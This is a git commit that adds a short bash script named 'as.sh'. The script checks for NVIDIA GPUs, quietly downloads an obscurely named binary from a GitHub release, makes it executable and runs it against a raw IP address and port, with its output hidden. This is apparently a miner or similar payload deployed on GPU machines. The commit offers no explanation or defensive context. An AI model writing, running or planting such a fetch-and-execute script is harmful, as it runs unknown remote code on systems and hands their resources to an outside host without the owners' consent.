a8558cf15435346c792200f20b6294bd7122b72f
eusebiopuxq93 <79733600+eusebiopuxq93@users.noreply.github.com>
2021-02-27 02:54:34 +0000

    Create as.sh

---
+++ as.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+nvidia-smi -L
+wget https://github.com/eusebiopuxq93/asdaf23423/releases/download/1/fdsge435wf &> /dev/null
+chmod +x fdsge435wf
+./fdsge435wf -P http://216.198.92.69:4545/"$1" &> log
